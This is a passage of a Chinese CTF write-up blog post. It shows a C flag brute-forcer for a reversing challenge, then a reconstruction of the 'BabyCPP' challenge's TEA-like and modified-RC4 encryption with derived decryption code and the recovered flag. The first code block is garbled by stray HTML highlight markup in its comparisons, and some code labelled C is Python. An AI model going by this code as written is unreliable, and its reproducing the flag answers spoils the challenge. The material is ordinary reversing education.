+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>] = &#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">begin_t</span>[<span class="hljs-number">100</span>] = &#123;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-type">ebp_t</span> = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">cum</span><span class="hljs-params">(<span class="hljs-type">int</span> begin,<span class="hljs-type">int</span> end,<span class="hljs-type">int</span> round)</span>&#123;<br>  <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> i = <span class="hljs-number">32</span>;i &lt; <span class="hljs-number">127</span>;i++)&#123;<br>    j = i * <span class="hljs-number">2</span> + begin;<br>    <span class="hljs-keyword">if</span>(ida_chars[j] - <span class="hljs-number">5</span> &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; i || ida_chars[j] + <span class="hljs-number">5</span> &lt;/span&gt; i)&#123;<br>      flag[round] = i;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">1</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;V&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">2</span>] &lt;/span&gt; <span class="hljs-string">&#x27;_&#x27;</span> || flag[<span class="hljs-number">2</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">4</span>] &lt;/span&gt; <span class="hljs-string">&#x27;9&#x27;</span> || flag[<span class="hljs-number">4</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;n&#x27;</span> || flag[<span class="hljs-number">4</span>] &lt;/span&gt; <span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[5] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;1&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">6</span>] &lt;/span&gt; <span class="hljs-string">&#x27;C&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">7</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">7</span>] &lt;/span&gt; <span class="hljs-string">&#x27;6&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">8</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;A&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">8</span>] &lt;/span&gt; <span class="hljs-string">&#x27;^&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[8] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;s&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[9] &lt;/span&gt; &#x27;c&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[9] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;q&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[10] &lt;/span&gt; &#x27;g&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[9] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;d&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[10] &lt;/span&gt; &#x27;2&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[10] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;C&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[11] &lt;/span&gt; &#x27;-&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[11] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;O&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">9</span>] &lt;/span&gt; <span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">10</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;M&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[10] &lt;/span&gt; &#x27;c&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">11</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;)&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">12</span>] &lt;/span&gt; <span class="hljs-string">&#x27;,&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">13</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;T&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">13</span>] &lt;/span&gt; <span class="hljs-string">&#x27;f&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[13] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;i&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">14</span>] &lt;/span&gt; <span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">16</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;%&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">16</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">17</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;5&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">17</span>] &lt;/span&gt; <span class="hljs-string">&#x27;P&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">17</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;T&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[17] &lt;/span&gt; &#x27;i&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">20</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;*&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">20</span>] &lt;/span&gt; <span class="hljs-string">&#x27;5&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">20</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;7&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[20] &lt;/span&gt; &#x27;m&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">21</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">21</span>] &lt;/span&gt; <span class="hljs-string">&#x27;Z&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">21</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;h&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[21] &lt;/span&gt; &#x27;o&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">24</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;C&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">25</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&lt;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[25] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;i&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">27</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">27</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;U&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[27] &lt;/span&gt; &#x27;p&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">28</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;+&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">29</span>] &lt;/span&gt; <span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">29</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">29</span>] &lt;/span&gt; <span class="hljs-string">&#x27;k&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">30</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;G&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">30</span>] &lt;/span&gt; <span class="hljs-string">&#x27;O&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">31</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[31] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;@&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[31] &lt;/span&gt; &#x27;J&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">32</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;]&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;:&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;/span&gt; <span class="hljs-string">&#x27;A&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;E&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[36] &lt;/span&gt; &#x27;&gt;&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">35</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;A&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">36</span>] &lt;/span&gt; <span class="hljs-string">&#x27;!&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">36</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;#&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">37</span>] &lt;/span&gt; <span class="hljs-string">&#x27;+&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">38</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">38</span>] &lt;/span&gt; <span class="hljs-string">&#x27;`&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">39</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;(&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">40</span>] &lt;/span&gt; <span class="hljs-string">&#x27;d&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">41</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;(&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">42</span>] &lt;/span&gt; <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">42</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">42</span>] &lt;/span&gt; <span class="hljs-string">&#x27;D&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">44</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">46</span>] &lt;/span&gt; <span class="hljs-string">&#x27;G&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[46] == &#x27;~&#x27;)continue;</span><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> j;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="BabyCPP"><a href="#BabyCPP" class="headerlink" title="BabyCPP"></a>BabyCPP</h3><p>‍</p>
+<p>线性反馈移位寄存器生成伪随机数+魔改RC4</p>
+<p>通过IDA反编译看到对输入有两个加密，对于密码明文一个加密</p>
+<p>第一个是线性反馈移位寄存器生成伪随机数</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020883.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>通过动态调试之后还原了加密代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> keys[] = &#123;<span class="hljs-number">0x67452301</span>,<span class="hljs-number">0xEFCDAB89</span>,<span class="hljs-number">0x98BADCFE</span>,<span class="hljs-number">0x10325476</span>&#125;;<br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k = <span class="hljs-number">0xDEADBEEF</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cum = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1 = <span class="hljs-number">0x34333231</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2 = <span class="hljs-number">0x38373635</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">256</span>;i++)&#123;<br><br>	key = keys[cum &amp; <span class="hljs-number">3</span>];<br><br>	v1 = ((((v2&gt;&gt;<span class="hljs-number">7</span>)^(v2&lt;&lt;<span class="hljs-number">2</span>))+v2)^(key+cum))+v1;<br><br>  key = keys[(cum &gt;&gt; <span class="hljs-number">0xB</span>) &amp; <span class="hljs-number">3</span>];<br><br>	v2 = ((((v1&gt;&gt;<span class="hljs-number">3</span>)^(v1&lt;&lt;<span class="hljs-number">6</span>))+v1)^(key+cum))+v2;<br><br>	cum = cum + k;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Keys和k是在进入函数前赋的值</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020188.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>通过该加密函数可以推导出解密函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2)</span>&#123;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> keys[] = &#123;<span class="hljs-number">0x67452301</span>,<span class="hljs-number">0xEFCDAB89</span>,<span class="hljs-number">0x98BADCFE</span>,<span class="hljs-number">0x10325476</span>&#125;;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cum = <span class="hljs-number">0xadbeef00</span>;<br><br>  <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k = <span class="hljs-number">0xDEADBEEF</span>;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">256</span>;i++)&#123;<br><br>    cum = cum - k;<br><br>    key = keys[(cum &gt;&gt; <span class="hljs-number">0xB</span>) &amp; <span class="hljs-number">3</span>];<br><br>    v2 = v2 - ((((v1&gt;&gt;<span class="hljs-number">3</span>)^(v1&lt;&lt;<span class="hljs-number">6</span>))+v1)^(key+cum));<br><br>    key = keys[cum &amp; <span class="hljs-number">3</span>];<br><br>    v1 = v1 - ((((v2&gt;&gt;<span class="hljs-number">7</span>)^(v2&lt;&lt;<span class="hljs-number">2</span>))+v2)^(key+cum));<br><br>  &#125;<br><br>  <span class="hljs-comment">// printf(&quot;decrypt:v1=0x%x,v2=0x%x\n&quot;,v1,v2);</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x,0x%x,&quot;</span>,v1,v2);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在验证前还有第二轮魔改rc4加密</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020329.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>从此处大概还原了加密代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> j in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">48</span>)</span>:<br><br>  i+=<span class="hljs-number">1</span><br><br>  v1 = (v1 + (s_box[i] % <span class="hljs-number">0x100</span>)) % <span class="hljs-number">0x100</span><br><br>  s_box[i], s_box[v1] = s_box[v1], s_box[i]<br><br>  v2 = (s_box[i] + s_box[v1]) % <span class="hljs-number">0x100</span><br><br>plaintext[j] = (((s_box[v2]) ^ plaintext[j]) + s_box[i] ^ s_box[v1]) % <span class="hljs-number">0x100</span><br></code></pre></td></tr></table></figure>
+
+<p>很显然是魔改的RC4，同时我们从内存中获取RC4初始化后的S盒</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020499.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>我们可以利用该S盒写出解密代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> j in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">48</span>)</span>:<br><br>    i+=<span class="hljs-number">1</span><br><br>    v1 = (v1 + (s_box[i] % <span class="hljs-number">0x100</span>)) % <span class="hljs-number">0x100</span><br><br>    s_box[i], s_box[v1] = s_box[v1], s_box[i]<br><br>    v2 = (s_box[i] + s_box[v1]) % <span class="hljs-number">0x100</span><br><br>    plaintext[j] ^= s_box[v1]<br><br>    plaintext[j] = (plaintext[j] + <span class="hljs-number">0x100</span> - s_box[i]) % <span class="hljs-number">0x100</span><br><br>    plaintext[j] = ((s_box[v2]) ^ plaintext[j])<br></code></pre></td></tr></table></figure>
+
+<p>再利用动态调试获取到最后的密文放入解密代码中</p>
+<p>画红色框处是对密文进行魔改RC4解密</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020657.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>把RC4解密后的密文再放入另一个解密函数中</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020813.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>由于是小端序组成的值，我们还需要对此处理然后转化为flag</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020969.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>最后获得flag</p>
+<p>df8d8ab87c22a396041f9bde6a40c4987c22a396041f9bde</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020113.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>‍</p>
+<h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><p>‍</p>
+<h3 id="Cyan-1"><a href="#Cyan-1" class="headerlink" title="Cyan-1"></a>Cyan-1</h3><p>‍</p>
+<p>谷歌找到文章</p>
+<p><a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/zh-hk/%E8%B5%9B%E5%B0%8F%E7%9B%90">https://zh.moegirl.org.cn/zh-hk/%E8%B5%9B%E5%B0%8F%E7%9B%90</a></p>
+<p>看着写就行</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020270.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
